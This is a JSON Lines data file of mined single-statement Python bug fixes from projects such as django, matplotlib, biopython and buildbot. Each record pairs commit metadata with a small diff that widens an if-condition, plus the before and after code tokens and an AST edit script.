{"project": "buildbot", "commit_sha": "91ff2b3648fd4c3fcba84a3465aa252ff3cad7da", "parent_sha": "4c0e8e2f3586c8843891d6a9523da71d01944956", "file_path": "slave/buildslave/scripts/startup.py", "project_url": "https://github.com/sigma-star/buildbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -83,7 +83,7 @@ def start(config):\n         sys.exit(1)\n \n     os.chdir(config['basedir'])\n-    if config['quiet']:\n+    if config['quiet'] or config['nodaemon']:\n         return launch(config)\n \n     # we probably can't do this os.fork under windows\n", "before": "if config [ 'quiet' ] : return launch ( config )", "after": "if config [ 'quiet' ] or config [ 'nodaemon' ] : return launch ( config )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 30], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"subscript\", 3, 8, 3, 23], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:config\", \"T\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'nodaemon'\", \"T\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3]]"}
{"project": "SublimeLinter3", "commit_sha": "480fd66463e150eec04c7b9aa884fa2395062528", "parent_sha": "edd00ae8dfed0e5d397ebc4933258b490293b394", "file_path": "lint/node_linter.py", "project_url": "https://github.com/keegoid/SublimeLinter3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -159,7 +159,7 @@ class NodeLinter(linter.Linter):\n \n         parent = path.normpath(path.join(cwd, '../'))\n \n-        if parent == '/':\n+        if parent == '/' or parent == cwd:\n             return None\n \n         return self.rev_parse_manifest_path(parent)\n", "before": "if parent == '/' : return None", "after": "if parent == '/' or parent == cwd : return None", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 24], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 25], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:parent\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:cwd\", \"T\"], 2]]"}
{"project": "matplotlib", "commit_sha": "51de4f95e437ff50b4e7c6c43d85451d6de4b013", "parent_sha": "cd6ec85cd3ef20205d7f9f80ea833bdba92c036c", "file_path": "lib/matplotlib/ticker.py", "project_url": "https://github.com/huayijing/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -173,8 +173,8 @@ class FixedFormatter(Formatter):\n         self.seq = seq\n         \n     def __call__(self, x, pos=None):\n-        'Return the format for tick val x at position pos'        \n-        if pos>=len(self.seq): return ''\n+        'Return the format for tick val x at position pos'\n+        if pos>=len(self.seq) or pos is None: return ''\n         else: return self.seq[pos]\n \n class FuncFormatter(Formatter):\n", "before": "if pos >= len ( self . seq ) : return '' else : return self . seq [ pos ]", "after": "if pos >= len ( self . seq ) or pos is None : return '' else : return self . seq [ pos ]", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 4, 9, 5, 35], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 4, 12, 4, 30], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:pos\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2]]"}
{"project": "matplotlib", "commit_sha": "f8bbd2e006fd13bbb2961a9dee5b89c49f38adb4", "parent_sha": "d960f0332d4d7d33f85c5489482a222f79f85bb5", "file_path": "setup.py", "project_url": "https://github.com/huayijing/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -297,7 +297,7 @@ if sys.version_info[0] >= 3:\n             # We need to skip certain files that have already been\n             # converted to Python 3.x\n             filtered = [x for x in files if should_2to3(x, self.build_lib)]\n-            if sys.platform.startswith('win'):\n+            if sys.platform.startswith('win') or True:\n                 # doing this in parallel on windows may crash your computer\n                 [refactor(f) for f in filtered]\n             else:\n", "before": "if sys . platform . startswith ( 'win' ) : [ refactor ( f ) for f in filtered ] else : ", "after": "if sys . platform . startswith ( 'win' ) or True : [ refactor ( f ) for f in filtered ] else : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 18], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 46], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "biopython", "commit_sha": "25096e7ba78bb14d3d942b90b01dcd527c09329a", "parent_sha": "3f3836de519ab1fa1f1cc20b2f69e8a4112d9252", "file_path": "Bio/SearchIO/_objects.py", "project_url": "https://github.com/paulhendricks/biopython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1425,7 +1425,7 @@ class HSPFragment(BaseHSP):\n                         len(opp_seq)))\n \n         seq_name = 'aligned %s sequence' % seq_type\n-        if isinstance(seq, SeqRecord):\n+        if isinstance(seq, SeqRecord) or seq is None:\n             return seq\n         elif isinstance(seq, basestring):\n             return SeqRecord(Seq(seq, self.alphabet), name=seq_name)\n", "before": "if isinstance ( seq , SeqRecord ) : return seq elif isinstance ( seq , basestring ) : return SeqRecord ( Seq ( seq , self . alphabet ) , name = seq_name )", "after": "if isinstance ( seq , SeqRecord ) or seq is None : return seq elif isinstance ( seq , basestring ) : return SeqRecord ( Seq ( seq , self . alphabet ) , name = seq_name )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 69], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 38], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:seq\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2]]"}
{"project": "biopython", "commit_sha": "5a582bc651360cfec3fca11597046644520d6f35", "parent_sha": "d8c1dce26a9f046fe73cbf8f943d03295c1b8a96", "file_path": "Bio/Phylo/PAML/_parse_codeml.py", "project_url": "https://github.com/paulhendricks/biopython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -181,7 +181,7 @@ def parse_model(lines, results):\n         # Find the estimated trees only taking the tree if it has\n         # lengths or rate estimates on the branches\n         elif tree_re.match(line) is not None:\n-            if \":\" in line:\n+            if \":\" in line or \"'#\" in line:\n                 if dS_tree_flag:\n                     results[\"dS tree\"] = line.strip()\n                     dS_tree_flag = False\n", "before": "if \":\" in line : if dS_tree_flag : results [ \"dS tree\" ] = line . strip ( ) dS_tree_flag = False", "after": "if \":\" in line or \"'#\" in line : if dS_tree_flag : results [ \"dS tree\" ] = line . strip ( ) dS_tree_flag = False", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 41], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 27], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:\\\"'#\\\"\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:line\", \"T\"], 2]]"}
{"project": "matplotlib", "commit_sha": "1642892799ae1431ddea662e1a4e06b94d760def", "parent_sha": "36c40f1fe250900ed043f7f8d207bfde21c77f0f", "file_path": "lib/matplotlib/rcsetup.py", "project_url": "https://github.com/huayijing/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -110,7 +110,7 @@ def validate_float(s):\n \n def validate_float_or_None(s):\n     \"\"\"convert s to float or raise\"\"\"\n-    if s is None:\n+    if s is None or s == 'None':\n         return None\n     try:\n         return float(s)\n", "before": "if s is None : return None", "after": "if s is None or s == 'None' : return None", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 20], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 17], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:s\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'None'\", \"T\"], 2]]"}
{"project": "liberapay.com", "commit_sha": "e8b0fcdcf3b4feff3e0219f203816b4759015b84", "parent_sha": "a0c951b13653023c7b107fd0605900258a32dd6b", "file_path": "gratipay/billing/payday.py", "project_url": "https://github.com/fracolo/liberapay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -390,7 +390,7 @@ class Payday(object):\n         holds = {}\n         for hold in CardHold.query.filter(CardHold.f.meta.state == 'new'):\n             state = 'new'\n-            if hold.failure_reason:\n+            if hold.status == 'failed' or hold.failure_reason:\n                 state = 'failed'\n             elif hold.voided_at:\n                 state = 'cancelled'\n", "before": "if hold . failure_reason : state = 'failed' elif hold . voided_at : state = 'cancelled'", "after": "if hold . status == 'failed' or hold . failure_reason : state = 'failed' elif hold . voided_at : state = 'cancelled'", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 36], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 16, 3, 35], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'failed'\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:hold\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:status\", \"T\"], 2]]"}
{"project": "liberapay.com", "commit_sha": "2e79b14ae8f9043581856e88d0345beb00b8d49e", "parent_sha": "9e74011e06efcf31b44b36e89350c0603c7bb3c5", "file_path": "gittip/models/community.py", "project_url": "https://github.com/fracolo/liberapay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ def get_list_for(user):\n-    if user.ANON:\n+    if user is None or user.ANON:\n         member_test = \"false\"\n         sort_order = 'DESC'\n         params = ()\n", "before": "if user . ANON : member_test = \"false\" sort_order = 'DESC' params = ( )", "after": "if user is None or user . ANON : member_test = \"false\" sort_order = 'DESC' params = ( )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 0, 5, 3, 20], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 0, 8, 0, 17], 2], [\"Insert\", \"N1\", [\"identifier:user\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2]]"}
{"project": "django", "commit_sha": "6fc10f50b0c9b877fffcad4893056cb91fa66b4f", "parent_sha": "4a1dfe4240f6891bf4f0907b973d3e1575cd7abc", "file_path": "django/db/backends/util.py", "project_url": "https://github.com/leon-song2000/django", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -91,7 +91,7 @@ def typecast_boolean(s):\n     return str(s)[0].lower() == 't'\n \n def typecast_decimal(s):\n-    if s is None:\n+    if s is None or s == '':\n         return None\n     return decimal.Decimal(s)\n \n", "before": "if s is None : return None", "after": "if s is None or s == '' : return None", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 20], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 17], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:s\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:''\", \"T\"], 2]]"}
{"project": "letsencrypt", "commit_sha": "7eb2bb4d037bd64ce4e31e3de303a968cc45db11", "parent_sha": "0b5c8e8d7183dd2efa64357249bd32df8f2b9058", "file_path": "letsencrypt/cli.py", "project_url": "https://github.com/Swift-2016/letsencrypt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1621,7 +1621,7 @@ def setup_log_file_handler(config, logfile, fmt):\n \n \n def _cli_log_handler(config, level, fmt):\n-    if config.text_mode or config.noninteractive_mode:\n+    if config.text_mode or config.noninteractive_mode or config.verb == \"renew\":\n         handler = colored_logging.StreamHandler()\n         handler.setFormatter(logging.Formatter(fmt))\n     else:\n", "before": "if config . text_mode or config . noninteractive_mode : handler = colored_logging . StreamHandler ( ) handler . setFormatter ( logging . Formatter ( fmt ) ) else : ", "after": "if config . text_mode or config . noninteractive_mode or config . verb == \"renew\" : handler = colored_logging . StreamHandler ( ) handler . setFormatter ( logging . Formatter ( fmt ) ) else : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 8, 3, 54], [\"boolean_operator\", 3, 8, 3, 54], 0], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 54], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 54], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:\\\"renew\\\"\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:config\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:verb\", \"T\"], 2]]"}
{"project": "django", "commit_sha": "6c9150d8181de83f341b94059d70ad4f1c04a684", "parent_sha": "71e8d5dd87569dd52f87918cfc32d56751c43b01", "file_path": "django/db/utils.py", "project_url": "https://github.com/leon-song2000/django", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ class ConnectionHandler(object):\n         except KeyError:\n             raise ConnectionDoesNotExist(\"The connection %s doesn't exist\" % alias)\n         conn.setdefault('ENGINE', 'django.db.backends.dummy')\n-        if conn['ENGINE'] == 'django.db.backends.':\n+        if conn['ENGINE'] == 'django.db.backends.' or not conn['ENGINE']:\n             conn['ENGINE'] = 'django.db.backends.dummy'\n         conn.setdefault('OPTIONS', {})\n         conn.setdefault('TEST_CHARSET', None)\n", "before": "if conn [ 'ENGINE' ] == 'django.db.backends.' : conn [ 'ENGINE' ] = 'django.db.backends.dummy'", "after": "if conn [ 'ENGINE' ] == 'django.db.backends.' or not conn [ 'ENGINE' ] : conn [ 'ENGINE' ] = 'django.db.backends.dummy'", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 56], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 51], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:conn\", \"T\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"string:'ENGINE'\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3]]"}
{"project": "pychess", "commit_sha": "df5b43e3e253c929a7ee4a3ee9cfb8c04725ab76", "parent_sha": "065eb510374547af7568833ccad6eee6087c7ce2", "file_path": "lib/pychess/ic/FICSObjects.py", "project_url": "https://github.com/Jnrolfe/pychess", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -541,7 +541,7 @@ class FICSGame (GObject):\n     \n     @property\n     def supported(self):\n-        if self.game_type.fics_name in GAME_TYPES:\n+        if self.game_type is GAME_TYPES_BY_FICS_NAME[\"wild\"] or self.game_type.fics_name in GAME_TYPES:\n             return not GAME_TYPES[self.game_type.fics_name].variant_type in UNSUPPORTED\n         else:\n             return False\n", "before": "if self . game_type . fics_name in GAME_TYPES : return not GAME_TYPES [ self . game_type . fics_name ] . variant_type in UNSUPPORTED else : return False", "after": "if self . game_type is GAME_TYPES_BY_FICS_NAME [ \"wild\" ] or self . game_type . fics_name in GAME_TYPES : return not GAME_TYPES [ self . game_type . fics_name ] . variant_type in UNSUPPORTED else : return False", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 25], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 50], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"subscript\", \"N3\"], 2], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:game_type\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:GAME_TYPES_BY_FICS_NAME\", \"T\"], 0], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N3\", [\"string:\\\"wild\\\"\", \"T\"], 2], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 3]]"}
{"project": "pychess", "commit_sha": "8c2154311643fbcb2f021f453db222a566f47566", "parent_sha": "19aeffaa36d9969c0aef04f20b931a6b4dda1c3b", "file_path": "lib/pychess/Utils/lutils/lmove.py", "project_url": "https://github.com/Jnrolfe/pychess", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -187,7 +187,7 @@ def toSAN (board, move):\n                 # If we doesn't share anything, it is standard to put file\n                 part0 += reprFile[x]\n     \n-    if tpiece != EMPTY:\n+    if tpiece != EMPTY or flag == ENPASSANT:\n         part1 = \"x\" + part1\n         if fpiece == PAWN:\n             part0 += reprFile[FILE(fcord)]\n", "before": "if tpiece != EMPTY : part1 = \"x\" + part1 if fpiece == PAWN : part0 += reprFile [ FILE ( fcord ) ]", "after": "if tpiece != EMPTY or flag == ENPASSANT : part1 = \"x\" + part1 if fpiece == PAWN : part0 += reprFile [ FILE ( fcord ) ]", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 43], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 23], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:flag\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:ENPASSANT\", \"T\"], 2]]"}
{"project": "reviewboard", "commit_sha": "9a0a0e21a3f618374c5a7149b4f6898a59d51543", "parent_sha": "2a2132702457381ad4170bbdeac763c2e15f3848", "file_path": "reviewboard/reviews/markdown_extensions.py", "project_url": "https://github.com/Hackthings/reviewboard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -104,7 +104,7 @@ class TrimTrailingEmptyParagraphs(Treeprocessor):\n         # Loop through the children from end to beginning, counting how many\n         # of them are empty <p> elements.\n         for child in reversed(root):\n-            if child.tag != 'p' or child.text:\n+            if child.tag != 'p' or child.text or len(child) > 0:\n                 break\n \n             start_i -= 1\n", "before": "if child . tag != 'p' or child . text : break", "after": "if child . tag != 'p' or child . text or len ( child ) > 0 : break", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 16, 3, 46], [\"boolean_operator\", 3, 16, 3, 46], 0], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 46], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 46], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\">:>\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:child\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "toaster-next", "commit_sha": "04b36b14b6867f7b3495844ead4d3e569c61e6d6", "parent_sha": "509ca8046613bbe145a47eec7134b78c1168e508", "file_path": "scripts/lib/bsp/engine.py", "project_url": "https://github.com/toastertester/toaster-next", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1674,7 +1674,7 @@ def yocto_bsp_list(args, scripts_path, properties_file):\n         arch_path = bsp_path + '/substrate/target/arch'\n         print \"Architectures available:\"\n         for arch in os.listdir(arch_path):\n-            if arch == \"common\":\n+            if arch == \"common\" or arch == \"layer\":\n                 continue\n             print \"    %s\" % arch\n         return True\n", "before": "if arch == \"common\" : continue", "after": "if arch == \"common\" or arch == \"layer\" : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 25], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 32], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:arch\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"layer\\\"\", \"T\"], 2]]"}
{"project": "toaster-next", "commit_sha": "ef7e3882a9fd173a22d3c378d91306cb609537d0", "parent_sha": "0519d1ae13d2f01c2ab71a8458007901ab434732", "file_path": "bitbake/lib/bb/command.py", "project_url": "https://github.com/toastertester/toaster-next", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -117,7 +117,7 @@ class Command:\n             return False\n \n     def finishAsyncCommand(self, msg=None, code=None):\n-        if msg:\n+        if msg or msg == \"\":\n             bb.event.fire(CommandFailed(msg), self.cooker.event_data)\n         elif code:\n             bb.event.fire(CommandExit(code), self.cooker.event_data)\n", "before": "if msg : bb . event . fire ( CommandFailed ( msg ) , self . cooker . event_data ) elif code : bb . event . fire ( CommandExit ( code ) , self . cooker . event_data )", "after": "if msg or msg == \"\" : bb . event . fire ( CommandFailed ( msg ) , self . cooker . event_data ) elif code : bb . event . fire ( CommandExit ( code ) , self . cooker . event_data )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 69], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:msg\", 3, 12, 3, 15], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:msg\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"\\\"\", \"T\"], 2]]"}
{"project": "toaster-next", "commit_sha": "e2d023ff5fbf6c11e7edeb1d5f27d9c6fb307cc5", "parent_sha": "4c4f714612d133dc51808ee5fe4b3ddc3d0681fa", "file_path": "bitbake/lib/bb/ui/uihelper.py", "project_url": "https://github.com/toastertester/toaster-next", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class BBUIHelper:\n             self.running_pids.remove(event.pid)\n             self.failed_tasks.append( { 'title' : \"%s %s\" % (event._package, event._task)})\n             self.needUpdate = True\n-        if isinstance(event, bb.runqueue.runQueueTaskStarted):\n+        if isinstance(event, bb.runqueue.runQueueTaskStarted) or isinstance(event, bb.runqueue.sceneQueueTaskStarted):\n             self.tasknumber_current = event.stats.completed + event.stats.active + event.stats.failed + 1\n             self.tasknumber_total = event.stats.total\n \n", "before": "if isinstance ( event , bb . runqueue . runQueueTaskStarted ) : self . tasknumber_current = event . stats . completed + event . stats . active + event . stats . failed + 1 self . tasknumber_total = event . stats . total", "after": "if isinstance ( event , bb . runqueue . runQueueTaskStarted ) or isinstance ( event , bb . runqueue . sceneQueueTaskStarted ) : self . tasknumber_current = event . stats . completed + event . stats . active + event . stats . failed + 1 self . tasknumber_total = event . stats . total", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 5, 54], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 62], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:event\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:sceneQueueTaskStarted\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:bb\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:runqueue\", \"T\"], 2]]"}
{"project": "toaster-next", "commit_sha": "54486a1ac30ff47e44be188db7c56e0917413799", "parent_sha": "2c9291dfb945203bd1ab3ab75c8b5de24cb32588", "file_path": "scripts/lib/recipetool/create.py", "project_url": "https://github.com/toastertester/toaster-next", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -324,7 +324,7 @@ def supports_srcrev(uri):\n def reformat_git_uri(uri):\n     '''Convert any http[s]://....git URI into git://...;protocol=http[s]'''\n     checkuri = uri.split(';', 1)[0]\n-    if checkuri.endswith('.git') or '/git/' in checkuri:\n+    if checkuri.endswith('.git') or '/git/' in checkuri or re.match('https?://github.com/[^/]+/[^/]+/?', checkuri):\n         res = re.match('(https?)://([^;]+(\\.git)?)(;.*)?$', uri)\n         if res:\n             # Need to switch the URI around so that the git fetcher is used\n", "before": "if checkuri . endswith ( '.git' ) or '/git/' in checkuri : res = re . match ( '(https?)://([^;]+(\\.git)?)(;.*)?$' , uri ) if res : ", "after": "if checkuri . endswith ( '.git' ) or '/git/' in checkuri or re . match ( 'https?://github.com/[^/]+/[^/]+/?' , checkuri ) : res = re . match ( '(https?)://([^;]+(\\.git)?)(;.*)?$' , uri ) if res : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 8, 3, 56], [\"boolean_operator\", 3, 8, 3, 56], 0], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 56], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 56], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:re\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:match\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'https?://github.com/[^/]+/[^/]+/?'\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:checkuri\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
